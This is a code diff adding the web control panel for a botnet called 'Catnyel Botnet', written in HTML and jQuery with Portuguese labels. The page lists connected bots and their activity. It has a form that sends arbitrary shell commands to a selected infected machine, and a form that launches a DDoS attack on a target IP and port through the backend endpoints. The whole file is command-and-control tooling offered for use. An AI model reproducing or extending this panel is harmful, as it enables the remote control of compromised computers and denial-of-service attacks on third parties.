@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html>
+    <meta charset="UTF-8"
+<head>
+    <title>Painél</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tailwindcss/2.2.7/tailwind.min.css">
+    <style>
+        #map {
+            height: 300px;
+        }
+
+        body {
+            /* Defina a cor de plano de fundo aqui */
+            /* ou, se preferir, defina uma imagem de plano de fundo */
+            /* background-image: url('caminho/para/sua/imagem.jpg'); */
+            background-image: url('https://catherineasquithgallery.com/uploads/posts/2021-02/1613054370_113-p-risunki-na-rizhem-fone-160.jpg');
+        }
+    </style>
+</head>
+<body class="bg-gray-100">
+    <!-- Sidebar -->
+    <div class="flex">
+        <div class="w-1/5 bg-white shadow-md">
+            <div class="p-4 flex items-center">
+                <h1 class="text-3xl font-bold text-blue-900">Catnyel Botnet</h1>
+            </div>
+            <ul class="mt-8">
+                <li class="my-4">
+                    <a href="#" id="overviewLink" class="flex items-center text-lg text-gray-700 hover:text-blue-500">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-6 h-6 mr-2">
+                            <path d="M3 4h18M3 8h18M3 12h18"></path>
+                        </svg>
+                        Visao Geral
+                    </a>
+                </li>
+                <li class="my-4">
+                    <a href="#" id="ddosLink" class="flex items-center text-lg text-gray-700 hover:text-blue-500">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-6 h-6 mr-2">
+                            <path d="M3 4h18M3 8h18M3 12h18"></path>
+                        </svg>
+                        DDoS
+                    </a>
+                </li>
+            </ul>
+        </div>
+
+        <!-- Main Content -->
+        <div class="flex-grow p-8">
+            <!-- Overview -->
+            <div id="overview" class="mb-8">
+                <h2 class="text-2xl font-bold mb-4">Visão Geral</h2>
+                <div class="bg-white rounded-lg p-6 shadow-md">
+                    <div class="mb-4">
+                        <h3 class="text-xl font-semibold">Bots Conectados</h3>
+                        <p id="connectedBotsCount" class="text-gray-600"></p>
+                    </div>
+                    <div>
+                        <h3 class="text-xl font-semibold">Atividade Dos Bots</h3>
+                        <ul id="botActivityList" class="mt-2">
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <!-- DDoS -->
+            <div id="ddos" class="hidden">
+                <h2 class="text-2xl font-bold mb-4">DDoS</h2>
+                <div class="bg-white rounded-lg p-6 shadow-md">
+                    <form id="ddosForm">
+                        <div class="mb-4">
+                            <label for="targetIP" class="block font-semibold mb-1">IP Alvo:</label>
+                            <input type="text" id="targetIP" class="border border-gray-300 rounded-md px-2 py-1 w-full">
+                        </div>
+                        <div class="mb-4">
+                            <label for="targetPort" class="block font-semibold mb-1">Porta Alvo:</label>
+                            <input type="text" id="targetPort" class="border border-gray-300 rounded-md px-2 py-1 w-full">
+                        </div>
+                        <!-- Add more DDoS options here -->
+                        <button type="submit" class="bg-blue-500 text-white rounded-md px-4 py-1">Começar DDoS</button>
+                    </form>
+                </div>
+            </div>
+
+            <!-- Command Form -->
+            <div class="mt-8">
+                <h2 class="text-2xl font-bold mb-4">Mandar Comando</h2>
+                <form id="commandForm">
+                    <div class="flex items-center mb-4">
+                        <label for="botSelect" class="mr-2">Bot:</label>
+                        <select id="botSelect" class="border border-gray-300 rounded-md px-2 py-1">
+                            <!-- Bot options will be dynamically added here -->
+                        </select>
+                    </div>
+                    <div class="flex items-center">
+                        <label for="commandInput" class="mr-2">Comando:</label>
+                        <input type="text" id="commandInput" class="border border-gray-300 rounded-md px-2 py-1">
+                        <button type="submit" class="bg-blue-500 text-white rounded-md px-4 py-1 ml-2">Mandar Comando</button>
+                    </div>
+                </form>
+            </div>
+
+            <!-- Command Output -->
+            <div class="mt-8">
+                <h2 class="text-2xl font-bold mb-4">Saída Do Comando:</h2>
+                <pre id="commandOutput"></pre>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <script>
+        var botLocations = []; // Store bot locations
+
+        // Update the connected bots count
+        function updateConnectedBotsCount() {
+            var count = botLocations.length;
+            $('#connectedBotsCount').text(count + ' Bot' + (count !== 1 ? 's' : '') + ' Connected');
+        }
+
+        // Update the bot select options
+        function updateBotSelectOptions() {
+            var botSelect = $('#botSelect');
+            botSelect.empty();
+            for (var i = 0; i < botLocations.length; i++) {
+                var bot = botLocations[i];
+                botSelect.append($('<option></option>').val(bot.bot_address).text(bot.bot_address));
+            }
+        }
+
+        // Update the command output with the response from the server
+        function updateCommandOutput(response) {
+            var commandOutput = $('#commandOutput');
+            commandOutput.text(response);
+        }
+
+        // Update the bot activity list
+        function updateBotActivityList(botActivity) {
+            var botActivityList = $('#botActivityList');
+            botActivityList.empty();
+            for (var i = 0; i < botActivity.length; i++) {
+                var activity = botActivity[i];
+                var listItem = $('<li></li>').text(activity.bot_address);
+                listItem.on('click', { activity: activity }, showBotActivityDetails);
+                botActivityList.append(listItem);
+            }
+        }
+
+        // Show the details of a specific bot activity
+        function showBotActivityDetails(event) {
+            var activity = event.data.activity;
+            var botDetails = $('#botDetails');
+            botDetails.empty();
+            botDetails.append($('<p></p>').text('Bot Address: ' + activity.bot_address));
+            botDetails.append($('<p></p>').text('Sent Commands: ' + activity.sent_commands));
+            botDetails.append($('<p></p>').text('Received Data Packets: ' + activity.received_packets));
+            botDetails.append($('<p></p>').text('CPU Usage: ' + activity.cpu_usage));
+        }
+
+        // Submit the command form via AJAX
+        $('#commandForm').on('submit', function(event) {
+            event.preventDefault();
+
+            var botAddress = $('#botSelect').val();
+            var command = $('#commandInput').val();
+
+            $.ajax({
+                url: '/send_command',
+                method: 'POST',
+                data: {
+                    bot_address: botAddress,
+                    command: command
+                },
+                success: function(data) {
+                    var results = data;
+                    var output = '';
+                    for (var i = 0; i < results.length; i++) {
+                        var result = results[i];
+                        output += 'Bot: ' + result.bot_address + '\n';
+                        output += 'Result: ' + result.result + '\n';
+                        output += '\n';
+                    }
+                    updateCommandOutput(output);
+                },
+                error: function(error) {
+                    console.log(error);
+                }
+            });
+
+            $('#commandInput').val('');
+        });
+
+        // Submit the DDoS form via AJAX
+        $('#ddosForm').on('submit', function(event) {
+            event.preventDefault();
+
+            var targetIP = $('#targetIP').val();
+            var targetPort = $('#targetPort').val();
+
+            $.ajax({
+                url: '/ddos',
+                method: 'POST',
+                data: {
+                    target_ip: targetIP,
+                    target_port: targetPort
+                },
+                success: function(data) {
+                    // Handle DDoS success response if needed
+                },
+                error: function(error) {
+                    console.log(error);
+                }
+            });
+
+            $('#targetIP').val('');
+            $('#targetPort').val('');
+        });
+
+        // Fetch and update the bots location from the server
+        function fetchBotsLocation() {
+            fetch('/bots_location')
+            .then(response => response.json())
+            .then(data => {
+                botLocations = data;
+                updateConnectedBotsCount();
+                updateBotSelectOptions();
+            })
+            .catch(error => {
+                console.log(error);
+            });
+        }
+
+        // Fetch and update the bot activity from the server
+        function fetchBotActivity() {
+            fetch('/bot_activity')
+            .then(response => response.json())
+            .then(data => {
+                updateBotActivityList(data);
+            })
+            .catch(error => {
+                console.log(error);
+            });
+        }
+
+        // Toggle visibility of dashboard sections
+        $('#overviewLink').on('click', function(event) {
+            event.preventDefault();
+            $('#overview').removeClass('hidden');
+            $('#ddos').addClass('hidden');
+        });
+
+        $('#ddosLink').on('click', function(event) {
+            event.preventDefault();
+            $('#overview').addClass('hidden');
+            $('#ddos').removeClass('hidden');
+        });
+
+        // Fetch and update the bots location initially
+        fetchBotsLocation();
+
+        // Fetch and update the bot activity every 5 seconds
+        setInterval(fetchBotActivity, 5000);
+    </script>
+</body>
+</html>
